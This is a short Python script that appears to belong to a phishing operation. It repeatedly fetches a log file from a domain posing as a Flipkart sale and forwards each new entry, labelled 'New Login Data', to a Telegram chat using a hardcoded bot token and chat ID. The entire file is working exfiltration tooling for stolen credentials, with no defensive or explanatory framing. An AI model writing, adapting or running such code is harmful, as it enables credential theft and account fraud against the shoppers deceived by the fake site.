import requests
import time

# === SETTINGS ===
BOT_TOKEN = "8235841299:AAGjEdVWSNdIpEh34GFCOxhLoHffkT1ct0E"
CHAT_ID = "7924753922"
LOG_URL = "https://flipkart-indian-sale-live.free.je/logs.txt"

# === LOGIC ===
last_line = ""

while True:
    try:
        r = requests.get(LOG_URL, timeout=10)
        if r.status_code == 200:
            lines = r.text.strip().split('\n')
            if lines:
                latest = lines[-1]
                if latest != last_line and latest != "":
                    last_line = latest
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                    data = {"chat_id": CHAT_ID, "text": f"🆕 New Login Data:\n{latest}"}
                    requests.post(url, data=data)
    except Exception as e:
        print("Error:", e)
    
    time.sleep(5)